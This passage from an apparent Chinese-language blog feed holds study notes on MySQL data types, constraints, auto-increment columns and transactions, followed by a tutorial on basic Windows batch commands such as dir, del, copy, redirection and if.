autor</span><br><span class="line">where nation=&#x27;中国&#x27;；</span><br></pre></td></tr></table></figure><ul><li>复制部分结构</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create table copy4</span><br><span class="line">select id, au_name</span><br><span class="line">from author</span><br><span class="line">where 0;</span><br></pre></td></tr></table></figure><h3 id="常见的数据类型"><a href="#常见的数据类型" class="headerlink" title="常见的数据类型"></a>常见的数据类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">数值型：</span><br><span class="line">整型</span><br><span class="line">小数：</span><br><span class="line">定点型</span><br><span class="line">浮点型</span><br><span class="line">字符型：</span><br><span class="line">较短的文本：char、varchar</span><br><span class="line">较长的文本：text，blob（较长的二进制数据）</span><br><span class="line">日期型</span><br></pre></td></tr></table></figure><h4 id="整型"><a href="#整型" class="headerlink" title="整型"></a>整型</h4><ol><li>分类：tinyint, smallint, mediumint, int\integer, bigint</li><li>特点：</li></ol><ul><li>如果不设置无符号还是有符号，默认是有符号，如果想设置无符号，还需要添加unsigned关键字</li><li>如果插入的数值超出了整型的范围，则插入的值为整型类型的最大值</li></ul><h4 id="小数"><a href="#小数" class="headerlink" title="小数"></a>小数</h4><ol><li>分类：</li></ol><ul><li>浮点型： float(M, D) , double(M, D)</li><li>定点型：dec(M, D) , decimal(M, D)</li></ul><ol start="2"><li>特点：</li></ol><ul><li>M：整数部位+加小数部位的总长度</li><li>D：小数部位长度</li><li>如果超过范围，则插入临界值</li><li>M，D可以省略，如果是decimal，则默认M是10,D是0，  若是float和double，则会根据插入数值的精度来决定</li><li>定点型精确度较高，如果要求插入数值的精确度较高如货币运算则考虑使用定点型</li></ul><h4 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h4><p>较短的文本：char、varchar<br>较长的文本：text，blob（较长的二进制数据）</p><ol><li>特点：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">          写法        M的意思                      特点        空间的耗费    效率  </span><br><span class="line">char     char(M)    最大的字符数，可以省略，默认为1  固定长度字符    比较耗费    较高</span><br><span class="line">varchar  varchar(M) 最大的字符数，不可以省略        可变长度字符    比较节省    较低</span><br></pre></td></tr></table></figure><h4 id="日期型"><a href="#日期型" class="headerlink" title="日期型"></a>日期型</h4><ol><li><p>分类：date 只保存日期</p><p>​            time 只保存时间</p><p>​            year 只保存年</p><p>​            datetime 保存日期+时间</p><p>​            timestamp 保存日期+时间</p></li><li><p>特点：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">字节   范围          时区等的影响</span><br><span class="line">datetime     8    1000-9999         不受</span><br><span class="line">timestamp    4    1970-2038          受</span><br></pre></td></tr></table></figure><h3 id="常见约束"><a href="#常见约束" class="headerlink" title="常见约束"></a>常见约束</h3><ol><li><p>含义：一种限制，用于限制表中的数据，为了保证表中数据的准确性和可靠性</p></li><li><p>分类：</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. not null: 非空用于保证该字段值不能为空</span><br><span class="line">2. default： 默认，用于赋予该字段默认值</span><br><span class="line">3. primary key: 主键，用于保证该字段的值具有唯一性，并且非空</span><br><span class="line">4. unique：用于保证该字段的值的唯一性</span><br><span class="line">5. check：检查约束【MySQL中不支持】 </span><br><span class="line">6. foreing key:外键约束，用于限制俩个表的关系，用于保证该字段的值必须来自于主表的关联列的值，在从表添加外键约束，用于引用主表中某列的值</span><br></pre></td></tr></table></figure><ol start="3"><li>添加约束的时机：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 创建表时</span><br><span class="line">2. 修改表时</span><br></pre></td></tr></table></figure><ol start="4"><li>约束的添加分类：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 列级约束：</span><br><span class="line">直接在字段名和类型后面追加约束类型即可</span><br><span class="line">六大约束语法上都支持，但外键约束没有效果</span><br><span class="line">2. 表级约束：</span><br><span class="line">在所有字段的最下面：constraint 约束名 约束类型（字段名）</span><br><span class="line">除了非空、默认约束，其他都支持</span><br></pre></td></tr></table></figure><ol start="5"><li>主键与唯一：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">保证唯一性   是否允许为空   一个表中可以有多少个    是否允许组合</span><br><span class="line">主键YN一个允许，不推荐</span><br><span class="line">唯一YY多个 允许，不推荐</span><br></pre></td></tr></table></figure><ol start="6"><li>外键约束</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 要求在从表中设置外键关系</span><br><span class="line">2. 从表的外键列的类型和主表的关联列的类型要求一致或兼容，名称无要求</span><br><span class="line">3. 主表的关联列必须是一个key（一般是主键或唯一）</span><br><span class="line">4. 插入数据时，先插入主表，再插入从表，删除时相反</span><br><span class="line"># 添加外键约束：</span><br><span class="line">alter table stuinfo add constraint 表名字 foreing key(majorid) references major(id);</span><br></pre></td></tr></table></figure><ol start="7"><li>修改表时添加约束：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 添加列级约束：</span><br><span class="line">alter table 表名 modify column 字段名 字段类型 新约束</span><br><span class="line">2. 添加表级约束：</span><br><span class="line">alter table 表名 add [constraint 约束名] 约束类型（字段名） 【外键的引用】</span><br></pre></td></tr></table></figure><ol start="8"><li>修改表时删除约束：</li></ol><p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBXJgK.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBXJgK.png"></p><h3 id="标识列"><a href="#标识列" class="headerlink" title="标识列"></a>标识列</h3><ol><li>又称为自增长列，可以不用手动的插入值，系统提供默认的序列值</li><li>特点：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 标识列不一定要和主键搭配，但必须要和一个key搭配</span><br><span class="line">2. 一个表至多只有一个标识列</span><br><span class="line">3. 标识列的类型只能是数值型</span><br><span class="line">4.标识列可以通过 set auto_increment_incremennt= ;设置步长</span><br><span class="line">可以通过手动插入值，设置起始值</span><br></pre></td></tr></table></figure><ol start="3"><li>修改表时设置标识列</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify column 字段值 类型 key名 auto_incerment;</span><br></pre></td></tr></table></figure><ol start="4"><li>修改表时删除标识列</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter table 表名 modify column 字段值 类型；</span><br></pre></td></tr></table></figure><h2 id="TCL语言"><a href="#TCL语言" class="headerlink" title="TCL语言"></a>TCL语言</h2><ol><li><p>事务控制语言，一个或一组sql语句组成一个执行单元，这个执行单元要么全部执行，要么全部不执行，比如转账的过程</p></li><li><p>事务的特性</p></li></ol><p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBXYjO.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBXYjO.png"></p><ol start="3"><li>事务的创建</li></ol><p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBX89x.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBX89x.png"></p><p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBXNuD.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBXNuD.png"></p><ul><li>实例</li></ul><p><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBXG36.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBXG36.png"></p><ol start="5"><li>事务隔离级别</li></ol><p><a href="https://imgtu.com/i/NBjXy8"><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBjXy8.md.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBjXy8.md.png"></a></p><p><a href="https://imgtu.com/i/NBjOQf"><img "" class="lazyload placeholder" data-original="https://s1.ax1x.com/2020/06/25/NBjOQf.md.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="NBjOQf.md.png"></a></p><ul><li>MySQL中默认隔离级别 repeatable read</li><li>oracle中默认级别 read committed</li><li>查看隔离级别 ：select @@tx_isolation;</li><li>设置隔离级别 ：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set session 或 global transaction isolation level 隔离级别；</span><br></pre></td></tr></table></figure><ol start="6"><li>savepoint 节点名，设置保存点</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 演示savepoint的使用</span><br><span class="line">set autocommit = 0;</span><br><span class="line">start transaction;</span><br><span class="line">delete from account where id=25;</span><br><span class="line">savepoint a;  #设置保存点</span><br><span class="line">delete from account where id=28;</span><br><span class="line">rollback to a;  #回滚到保存点</span><br><span class="line"></span><br><span class="line">select * from account;</span><br><span class="line"></span><br><span class="line">结果：id=28还在，id=25没有</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> sql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bat批处理</title>
      <link href="/2020/09/14/bat%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6/"/>
      <url>/2020/09/14/bat%E6%89%B9%E5%A4%84%E7%90%86%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="bat批处理命令及解释"><a href="#bat批处理命令及解释" class="headerlink" title="bat批处理命令及解释"></a>bat批处理命令及解释</h1><p><a href="https://www.cnblogs.com/xpwi/p/9626959.html">相关原文链接</a></p><h2 id="一、批处理概念"><a href="#一、批处理概念" class="headerlink" title="一、批处理概念"></a>一、批处理概念</h2><ul><li>批处理文件：包含DOS命令的可编辑可执行文件</li><li>批处理：可以对某一对象批量操作的文件</li></ul><span id="more"></span><h2 id="二、批处理命令简介"><a href="#二、批处理命令简介" class="headerlink" title="二、批处理命令简介"></a>二、批处理命令简介</h2><h3 id="命令1-10"><a href="#命令1-10" class="headerlink" title="命令1~10"></a>命令1~10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">1 echo 和 @</span><br><span class="line">回显命令</span><br><span class="line">@  #关闭单行回显</span><br><span class="line">echo off  #从下一行开始关闭回显</span><br><span class="line">@echo off  #从本行开始关闭回显。一般批处理第一行都是这个</span><br><span class="line">echo on #从下一行开始打开回显</span><br><span class="line">echo #显示当前是 echo off 状态还是 echo on 状态</span><br><span class="line">echo. #输出一个”回车换行”，空白行</span><br><span class="line">#(同echo, echo; echo+ echo[ echo] echo/ echo)</span><br><span class="line"></span><br><span class="line">2 errorlevel</span><br><span class="line">echo %errorlevel%</span><br><span class="line">每个命令运行结束，可以用这个命令行格式查看返回码</span><br><span class="line">默认值为0，一般命令执行出错会设 errorlevel 为1</span><br><span class="line"></span><br><span class="line">3 dir</span><br><span class="line">显示文件夹内容</span><br><span class="line">dir #显示当前目录中的文件和子目录</span><br><span class="line">dir /a #显示当前目录中的文件和子目录，包括隐藏文件和系统文件</span><br><span class="line">dir c: /a:d #显示 C 盘当前目录中的目录</span><br><span class="line">dir c: /a:-d #显示 C 盘根目录中的文件</span><br><span class="line">dir c: /b/p #/b只显示文件名，/p分页显示</span><br><span class="line">dir *.exe /s #显示当前目录和子目录里所有的.exe文件</span><br><span class="line"></span><br><span class="line">4 cd</span><br><span class="line">切换目录</span><br><span class="line">cd #进入根目录</span><br><span class="line">cd #显示当前目录</span><br><span class="line">cd /d d:sdk #可以同时更改盘符和目录</span><br><span class="line"></span><br><span class="line">5 md</span><br><span class="line">创建目录</span><br><span class="line">md d:abc #如果 d:a 不存在，将会自动创建中级目录</span><br><span class="line">#如果命令扩展名被停用，则需要键入 mkdir abc</span><br><span class="line"></span><br><span class="line">6 rd</span><br><span class="line">删除目录</span><br><span class="line">rd abc #删除当前目录里的 abc 子目录，要求为空目录</span><br><span class="line">rd /s/q d:temp #删除 d:temp 文件夹及其子文件夹和文件，/q安静模式</span><br><span class="line"></span><br><span class="line">7 del</span><br><span class="line">删除文件</span><br><span class="line">del d:test.txt #删除指定文件，不能是隐藏、系统、只读文件</span><br><span class="line">del /q/a/f d:temp*.*</span><br><span class="line">删除 d:temp 文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录</span><br><span class="line">del /q/a/f/s d:temp*.*</span><br><span class="line">删除 d:temp 及子文件夹里面的所有文件，包括隐藏、只读、系统文件，不包括子目录</span><br><span class="line"></span><br><span class="line">8 ren</span><br><span class="line">重命名命令</span><br><span class="line">ren d:temp tmp #支持对文件夹的重命名</span><br><span class="line"></span><br><span class="line">9 cls</span><br><span class="line">清屏</span><br><span class="line">10 type</span><br><span class="line">显示文件内容</span><br><span class="line">type c:boot.ini #显示指定文件的内容，程序文件一般会显示乱码</span><br><span class="line">type *.txt #显示当前目录里所有.txt文件的内容</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="命令11-20"><a href="#命令11-20" class="headerlink" title="命令11~20"></a>命令11~20</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">11 copy</span><br><span class="line">拷贝文件</span><br><span class="line">copy c:test.txt d:test.bak</span><br><span class="line">复制 c:test.txt 文件到 d: ，并重命名为 test.bak</span><br><span class="line">copy con test.txt</span><br><span class="line">从屏幕上等待输入，按 Ctrl+Z 结束输入，输入内容存为test.txt文件</span><br><span class="line">con代表屏幕，prn代表打印机，nul代表空设备</span><br><span class="line">copy 1.txt + 2.txt 3.txt</span><br><span class="line">合并 1.txt 和 2.txt 的内容，保存为 3.txt 文件</span><br><span class="line">如果不指定 3.txt ，则保存到 1.txt</span><br><span class="line">copy test.txt +</span><br><span class="line">复制文件到自己，实际上是修改了文件日期</span><br><span class="line"></span><br><span class="line">12 title</span><br><span class="line">设置cmd窗口的标题</span><br><span class="line">title 新标题 #可以看到cmd窗口的标题栏变了</span><br><span class="line"></span><br><span class="line">13 ver</span><br><span class="line">显示系统版本</span><br><span class="line"></span><br><span class="line">14 label 和 vol</span><br><span class="line">设置卷标</span><br><span class="line">vol #显示卷标</span><br><span class="line">label #显示卷标，同时提示输入新卷标</span><br><span class="line">label c:system #设置C盘的卷标为 system</span><br><span class="line"></span><br><span class="line">15 pause</span><br><span class="line">暂停命令 //常用于使命令行窗口暂停，不至于打开bat文件后立即结束</span><br><span class="line"></span><br><span class="line">16 rem 和 ::</span><br><span class="line">注释命令</span><br><span class="line">注释行不执行操作</span><br><span class="line"></span><br><span class="line">17 date 和 time</span><br><span class="line">日期和时间</span><br><span class="line">date #显示当前日期，并提示输入新日期，按&quot;回车&quot;略过输入</span><br><span class="line">date/t #只显示当前日期，不提示输入新日期</span><br><span class="line">time #显示当前时间，并提示输入新时间，按&quot;回车&quot;略过输入</span><br><span class="line">time/t #只显示当前时间，不提示输入新时间</span><br><span class="line"></span><br><span class="line">18 goto 和 :</span><br><span class="line">跳转命令</span><br><span class="line">:label #行首为:表示该行是标签行，标签行不执行操作</span><br><span class="line">goto label #跳转到指定的标签那一行</span><br><span class="line"></span><br><span class="line">19 find (外部命令)</span><br><span class="line">查找命令</span><br><span class="line">find &quot;abc&quot; c:test.txt</span><br><span class="line">在 c:test.txt 文件里查找含 abc 字符串的行</span><br><span class="line">如果找不到，将设 errorlevel 返回码为1</span><br><span class="line">find /i “abc” c:test.txt</span><br><span class="line">查找含 abc 的行，忽略大小写</span><br><span class="line">find /c &quot;abc&quot; c:test.txt</span><br><span class="line">显示含 abc 的行的行数</span><br><span class="line"></span><br><span class="line">20 more (外部命令)</span><br><span class="line">逐屏显示</span><br><span class="line">more c:test.txt #逐屏显示 c:test.txt 的文件内容</span><br></pre></td></tr></table></figure><h3 id="命令21-30"><a href="#命令21-30" class="headerlink" title="命令21~30"></a>命令21~30</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">21 tree</span><br><span class="line">显示目录结构</span><br><span class="line">tree d: #显示D盘的文件目录结构</span><br><span class="line"></span><br><span class="line">22 &amp;</span><br><span class="line">顺序执行多条命令，而不管命令是否执行成功</span><br><span class="line"></span><br><span class="line">23 &amp;&amp;</span><br><span class="line">顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令</span><br><span class="line">find &quot;ok&quot; c:test.txt &amp;&amp; echo 成功</span><br><span class="line">如果找到了&quot;ok&quot;字样，就显示&quot;成功&quot;，找不到就不显示</span><br><span class="line"></span><br><span class="line">24 ||</span><br><span class="line">顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</span><br><span class="line">find &quot;ok&quot; c:test.txt || echo 不成功</span><br><span class="line">如果找不到&quot;ok&quot;字样，就显示&quot;不成功&quot;，找到了就不显示</span><br><span class="line"></span><br><span class="line">25 |</span><br><span class="line">管道命令</span><br><span class="line">dir *.* /s/a | find /c &quot;.exe&quot;</span><br><span class="line">管道命令表示先执行 dir 命令，对其输出的结果执行后面的 find 命令</span><br><span class="line">该命令行结果：输出当前文件夹及所有子文件夹里的.exe文件的个数</span><br><span class="line">type c:test.txt|more</span><br><span class="line">这个和 more c:test.txt 的效果是一样的</span><br><span class="line"></span><br><span class="line">26 &gt; 和 &gt;&gt;</span><br><span class="line">输出重定向命令</span><br><span class="line">&gt; 清除文件中原有的内容后再写入</span><br><span class="line">&gt;&gt; 追加内容到文件末尾，而不会清除原有的内容</span><br><span class="line">主要将本来显示在屏幕上的内容输出到指定文件中</span><br><span class="line">指定文件如果不存在，则自动生成该文件</span><br><span class="line">type c:test.txt &gt;prn</span><br><span class="line">屏幕上不显示文件内容，转向输出到打印机</span><br><span class="line">echo hello world&gt;con</span><br><span class="line">在屏幕上显示hello world，实际上所有输出都是默认 &gt;con 的</span><br><span class="line">copy c:test.txt f: &gt;nul</span><br><span class="line">拷贝文件，并且不显示&quot;文件复制成功&quot;的提示信息，但如果f盘不存在，还是会显示出错信息</span><br><span class="line">copy c:test.txt f: &gt;nul 2&gt;nul</span><br><span class="line">不显示”文件复制成功”的提示信息，并且f盘不存在的话，也不显示错误提示信息</span><br><span class="line">echo ^^W ^&gt; ^W&gt;c:test.txt</span><br><span class="line">生成的文件内容为 ^W &gt; W</span><br><span class="line">^ 和 &gt; 是控制命令，要把它们输出到文件，必须在前面加个 ^ 符号</span><br><span class="line"></span><br><span class="line">27 &lt;</span><br><span class="line">从文件中获得输入信息，而不是从屏幕上</span><br><span class="line">一般用于 date time label 等需要等待输入的命令</span><br><span class="line">@echo off</span><br><span class="line">echo 2005-05-01&gt;temp.txt</span><br><span class="line">date &lt;temp.txt</span><br><span class="line">del temp.txt</span><br><span class="line">这样就可以不等待输入直接修改当前日期</span><br><span class="line"></span><br><span class="line">28 %0 %1 %2 %3 %4 %5 %6 %7 %8 %9 %*</span><br><span class="line">命令行传递给批处理的参数  //上一个命令的结果作为参数</span><br><span class="line">%0 批处理文件本身</span><br><span class="line">%1 第一个参数</span><br><span class="line">%9 第九个参数</span><br><span class="line">%* 从第一个参数开始的所有参数</span><br><span class="line">批参数(%n)的替代已被增强。您可以使用以下语法:</span><br><span class="line">%~1 - 删除引号(&quot; )， 扩充 %1</span><br><span class="line">%~f1 - 将 %1 扩充到一个完全合格的路径名</span><br><span class="line">%~d1 - 仅将 %1 扩充到一个驱动器号</span><br><span class="line">%~p1 - 仅将 %1 扩充到一个路径</span><br><span class="line">%~n1 - 仅将 %1 扩充到一个文件名</span><br><span class="line">%~x1 - 仅将 %1 扩充到一个文件扩展名</span><br><span class="line">%~s1 - 扩充的路径指含有短名</span><br><span class="line">%~a1 - 将 %1 扩充到文件属性</span><br><span class="line">%~t1 - 将 %1 扩充到文件的日期/时间</span><br><span class="line">%~z1 - 将 %1 扩充到文件的大小</span><br><span class="line">%~$PATH : 1 - 查找列在 PATH 环境变量的目录，并将 %1</span><br><span class="line">扩充到找到的第一个完全合格的名称。如果环境</span><br><span class="line">变量名未被定义，或者没有找到文件，此组合键会</span><br><span class="line">扩充到空字符串</span><br><span class="line">可以组合修定符来取得多重结果:</span><br><span class="line">%~dp1 - 只将 %1 扩展到驱动器号和路径</span><br><span class="line">%~nx1 - 只将 %1 扩展到文件名和扩展名</span><br><span class="line">%~dp$PATH:1 - 在列在 PATH 环境变量中的目录里查找 %1，</span><br><span class="line">并扩展到找到的第一个文件的驱动器号和路径。</span><br><span class="line">%~ftza1 - 将 %1 扩展到类似 DIR 的输出行。</span><br><span class="line">可以参照 call/? 或 for/? 看出每个参数的含意</span><br><span class="line">echo load &quot;%%1&quot; &quot;%%2&quot;&gt;c:test.txt</span><br><span class="line">生成的文件内容为 load &quot;%1&quot;  &quot;%2&quot;</span><br><span class="line">批处理文件里，用这个格式把命令行参数输出到文件</span><br><span class="line"></span><br><span class="line">29 if</span><br><span class="line">判断命令</span><br><span class="line">if &quot;%1&quot;==&quot;/a&quot; echo 第一个参数是/a</span><br><span class="line">if /i &quot;%1&quot; equ &quot;/a&quot; echo 第一个参数是/a</span><br><span class="line">/i 表示不区分大小写，equ 和 == 是一样的，其它运算符参见 if/?</span><br><span class="line">if exist c:test.bat echo 存在c:test.bat文件</span><br><span class="line">if not exist c:windows (</span><br><span class="line">echo 不存在c:windows文件夹</span><br><span class="line">)</span><br><span class="line">if exist c:test.bat (</span><br><span class="line">echo 存在c:test.bat</span><br><span class="line">) else (</span><br><span class="line">echo 不存在c:test.bat</span><br><span class="line">)</span><br><span class="line">30 setlocal 和 endlocal</span><br><span class="line">设置”命令扩展名”和”延缓环境变量扩充”</span><br><span class="line">SETLOCAL ENABLEEXTENSIONS #启用&quot;命令扩展名&quot;</span><br><span class="line">SETLOCAL DISABLEEXTENSIONS #停用&quot;命令扩展名&quot;</span><br><span class="line">SETLOCAL ENABLEDELAYEDEXPANSION #启用&quot;延缓环境变量扩充&quot;</span><br><span class="line">SETLOCAL DISABLEDELAYEDEXPANSION #停用&quot;延缓环境变量扩充&quot;</span><br><span class="line">ENDLOCAL #恢复到使用SETLOCAL语句以前的状态</span><br><span class="line">“命令扩展名”默认为启用</span><br><span class="line">“延缓环境变量扩充”默认为停用</span><br><span class="line">批处理结束系统会自动恢复默认值</span><br><span class="line">可以修改注册表以禁用&quot;命令扩展名&quot;，详见 cmd /? 